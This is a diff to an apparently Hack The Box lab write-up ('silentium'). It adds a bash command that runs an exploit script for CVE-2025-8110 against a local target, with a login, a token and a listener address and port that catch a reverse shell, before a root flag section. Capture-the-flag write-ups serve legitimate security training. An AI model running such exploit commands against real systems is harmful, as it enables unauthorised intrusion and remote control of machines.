@@ -789,6 +789,11 @@ i got the token from the settings after successfull register / login.
 
 Once the exploit executed successfully, I obtained command execution.
 
+```bash
+python3 CVE-2025-8110.py -u http://127.0.0.1:3001 -un mensi -pw mensi \
+-t 02a40aa17aa0dd7ead44bc372fe76d6d9549762e -lh 10.10.15.117 -lp 4444
+```
+
 ![Alt text](../assets/htb/silentium/18.png)
 
 ## 13. Root Flag
